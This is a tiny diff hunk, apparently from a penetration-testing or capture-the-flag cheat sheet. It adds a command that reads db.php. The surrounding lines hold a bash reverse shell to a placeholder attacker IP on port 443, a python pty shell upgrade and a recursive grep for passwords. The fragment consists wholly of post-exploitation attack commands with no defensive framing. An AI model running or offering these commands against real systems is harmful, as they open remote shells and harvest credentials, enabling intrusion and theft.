@@ -17,3 +17,4 @@ bash -c "bash -i >& /dev/tcp/{your_IP}/443 0>&1"
 python3 -c 'import pty;pty.spawn("/bin/bash")'
 
 cat * | grep -i passw*
+cat db.php
